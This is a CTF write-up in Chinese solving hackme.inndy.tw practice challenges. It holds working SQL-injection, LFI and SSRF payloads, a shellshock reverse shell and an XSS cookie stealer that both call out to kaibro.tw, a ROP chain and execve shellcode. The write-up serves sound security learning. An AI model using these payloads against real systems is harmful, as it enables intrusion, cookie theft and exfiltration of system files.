# WriteUp

## Misc

### flag

trivial

### corgi can fly

直接用stegsolver開

然後可以發現裡頭藏QR code

解開就是FLAG

### television

直接`strings`就能看到FLAG

### where is flag

用正規表達式`FLAG{[a-zA-Z0-9]*}`搜尋

### pusheen.txt

裡面就是一串黑白pusheen的圖片

白的當0，黑的當1，還原回去ascii，就是FLAG

```ruby
data='010001100100110001000001010001110111101101010000011101010111001101101000011001010110010101101110001000000100111101001001010011110100111101001111010010010100100101001111010011110100100101001111010011110100100101001001010011110100111101001111010010010100111101001111010011110100111101001111010010010100111101001001010011110100111101001111010010010100100101001001001000000100001101110101011101000110010101111101'
puts data.scan(/[01]{8}/).map { |e| e.to_i 2 }.inject '', &:concat
```

## Web

### hide and seek

FLAG在最底下，字體顏色是白色

### guestbook

union based mysql injection

爆欄位名：

`https://hackme.inndy.tw/gb/?mod=read&id=1%20and%201=2%20union%20select%201,2,3,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27flag%27`

爆flag內容：

`https://hackme.inndy.tw/gb/?mod=read&id=1%20and%201=2%20union%20select%201,2,3,group_concat(flag)%20from%20flag`

### LFI

直接php://filter讀檔

`https://hackme.inndy.tw/lfi/?page=php://filter/convert.base64-encode/resource=pages/config`

### homepage

直接執行`cute.js`裡的code

會生出一張QR code

解碼後就是FLAG

### ping

head沒擋

``` 
`head fla?.p?p` 
```

### scoreboard

FLAG在response header

### login as admin 0

usernmae: `admin`

password: `admin\'union select 1, 2,3,1 -- `

### login as admin 0.1

一樣在password注入

union based mysql injection

爆庫名：

`admin\'union select 1, group_concat(schema_name),3,1 from information_schema.schemata -- `

爆表名：

`admin\'union select 1, group_concat(table_name),3,1 from information_schema.tables where table_schema=0x6c6f67696e5f61735f61646d696e30 -- `

爆Column:

`admin\'union select 1, group_concat(column_name),3,1 from information_schema.columns where table_name=0x68316464656e5f66313467 -- `

爆flag:

`admin\'union select 1, the_f14g,3,1 from login_as_admin0.h1dden_f14g -- `

### login as admin 1

username: `admin`

password: `admin\'union/**/select/**/1,2,3,1#`

就是空白換成註解而以

### login as admin 1.2

Boolean Based MySQL Injection

可以透過下面這種方式來爆：

`name=admin&password=admin\'or/**/(select/**/ascii(mid(schema_name,1,1))>125/**/from/**/information_schema.schemata/**/limit/**/0,1)#`

Table: `0bdb54c98123f5526ccaed982d2006a9`

Column: `4a391a11cfa831ca740cf8d00782f3a6`


### login as admin 4

`curl --data 'name=admin&password=admin' https://hackme.inndy.tw/login4/`

### login as admin 6

這題就`json_decode`，然後變數覆蓋

payload:

`data={"users":{"admin":"kaibro"},"username":"admin","password":"kaibro"}`

### login as admin 7

php weak type比較

password: `240610708`

`md5(240610708) == 0e462097431906509019562988736854`

### dafuq-manager 1

把cookie的`show_hidden`改成yes即可


### webshell

把`eval`改成`echo`，可以簡單還原出原本的code

詳細可參考：http://blog.kaibro.tw/2018/01/16/AIS3-EOF-2017-%E5%88%9D%E8%B3%BD/

我的Payload script:

```php
<?php
$cmd = $_GET['c'];
$s =  hash('SHA512',$_SERVER['REMOTE_ADDR']) ^ $cmd;
$key = $_SERVER['HTTP_USER_AGENT'] . sha1("webshell.eof-ctf.ais3.ntu.st");
$sig = hash_hmac('SHA512', $cmd, $key);
echo "input sig: ".$sig;
echo "<br>";
echo "input cmd: ".urlencode($s);
```

### command-executor

這題可以LFI，然後看code可以發現暗示shellshock

用shellshock拿shell:

`() { :a; }; /bin/bash -c '/bin/bash -i >& /dev/tcp/kaibro.tw/5278 0>&1'`

然後去解/flag-reader即可

### xssme

我的payload:

`<svg/onload="document.location='http://kaibro.tw/log.php?c='+document.cookie">`

### xssrf leak

因為過濾一堆東西，直接把js部分用hex編碼即可繞過

可以發現admin panel有request.php，可以送request並讀出內容

這裏可以SSRF，可以用file協議讀檔

例如以下這樣，可以讀`/etc/passwd`

```javascript
xmlhttp=new XMLHttpRequest();
xmlhttp.onreadystatechange=function()
{
        if (xmlhttp.readyState==4 && xmlhttp.status==200)
        {
            document.location='http://kaibro.tw/log.php?c='+btoa(xmlhttp.responseText);
        }
}
xmlhttp.open("POST","request.php",true);
xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
xmlhttp.send("url=file:///etc/passwd");
```

讀`/var/www/html/config.php`就可以看到FLAG

### xssrf redis

這題跟上題一樣，是利用request.php去做SSRF

只是這題FLAG藏在redis中

可以用`gopher`來做redis的未授權訪問

把裡面的flag dump出來

### wordpress1

這題搜一下，core.php裡可以發現`print_f14g()`這個函數

其中的`$h`，就是md5

後面那串`5ada11fd9c69c78ea65c832dd7f9bbde`就是`cat flag`

接著還要繞過`wp_get_user_ip() === '127.0.0.1'`，才會執行後面那一坨

這邊跟進去可以發現，可以用`X-Forwarded-For` header來繞過IP限制

接著只要訪問`https://wp.hackme.inndy.tw/?passw0rd=cat%20flag`就噴FLAG惹

## Reversing

### helloworld

`objdump -d -M intel ./helloworld`

可以看到比較的部分：

`cmp    eax,0x12b9b0a1`

所以只要輸入`0x12b9b0a1`，也就是`314159265`，就會噴FLAG

### simple

可以發現他會把我們輸入的字串，每個chr的ascii加1

然後跟`UIJT.JT.ZPVS.GMBH`做比較

所以只要把這串每個ascii都減1，就是FLAG惹

```python
a = 'UIJT.JT.ZPVS.GMBH'

for i in range(len(a)):
    print chr(ord(a[i])-1),
```

## Pwn

### catflag

直接連上就有shell惹

### homework

這題修改陣列沒限制範圍

可以直接改到後面的return address (index: 14)

直接改成`call_me_maybe()`的位址即可(0x080485fb = 134514171)

### ROP

直接用`ROPGadget`即可

```python
#!/usr/bin/env python2
from struct import pack

# Padding goes here
p = 'a'*16
p += pack('<I', 0x0806ecda) # pop edx ; ret
p += pack('<I', 0x080ea060) # @ .data
p += pack('<I', 0x080b8016) # pop eax ; ret
p += '/bin'
p += pack('<I', 0x0805466b) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806ecda) # pop edx ; ret
p += pack('<I', 0x080ea064) # @ .data + 4
p += pack('<I', 0x080b8016) # pop eax ; ret
p += '//sh'
p += pack('<I', 0x0805466b) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806ecda) # pop edx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x080492d3) # xor eax, eax ; ret
p += pack('<I', 0x0805466b) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481c9) # pop ebx ; ret
p += pack('<I', 0x080ea060) # @ .data
p += pack('<I', 0x080de769) # pop ecx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x0806ecda) # pop edx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x080492d3) # xor eax, eax ; ret
p += pack('<I', 0x0807a66f) # inc eax ; ret
p += pack('<I', 0x0807a66f) # inc eax ; ret
p += pack('<I', 0x0807a66f) # inc eax ; ret
p += pack('<I', 0x0807a66f) # inc eax ; ret
p += pack('<I', 0x0807a66f) # inc eax ; ret
p += pack('<I', 0x0807a66f) # inc eax ; ret
p += pack('<I', 0x0807a66f) # inc eax ; ret
p += pack('<I', 0x0807a66f) # inc eax ; ret
p += pack('<I', 0x0807a66f) # inc eax ; ret
p += pack('<I', 0x0807a66f) # inc eax ; ret
p += pack('<I', 0x0807a66f) # inc eax ; ret
p += pack('<I', 0x0806c943) # int 0x80
print p
```

### toooomuch

找一下可發現passcode為43210

然後就是玩猜數字比大小遊戲，可以一直猜，猜對就噴FLAG給你

### toooomuch 2

這題就是strcpy的地方有洞，可以蓋無限長到return address

直接塞shellcode，然後把return address蓋成shellcode位址即可

payload:

`perl -e 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80","\x90"x5,"\x60\x9c\x04\x08\n"'`

## Crypto

### easy

直接解hex，會得到base64加密過的字串

再解base64就能拿到FLAG

### r u kidding

凱撒密碼

## Programming

### fast

這題有一些坑，答案必須在int32範圍內

所以python預設精度太高，送過去反而會錯

```python
from pwn import *
import numpy as np

r = remote('hackme.inndy.tw', 7707)

r.recvuntil("Send 'Yes I know' to start the game.")
r.sendline('Yes I know')
ans = ''
res = ''
for i in range(10000):
    c = r.recvuntil("=")[0:-1]
    r.recvline()
    tmp = c.strip().split(' ')
    if tmp[1] == '+': 
        ans = str(np.int32(int(tmp[0])) + np.int32((tmp[2])))
    if tmp[1] == '-':
        ans = str(np.int32(int(tmp[0])) - np.int32(int(tmp[2])))
    if tmp[1] == '*':
        ans = str(np.int32(int(tmp[0])) * np.int32(int(tmp[2])))
    if tmp[1] == '/':
        gg = (int)(1.0 * int(tmp[0]) / int(tmp[2]))
        ans = str(gg)
    res += (ans + " ")
    
r.sendline(res)
r.interactive()
```
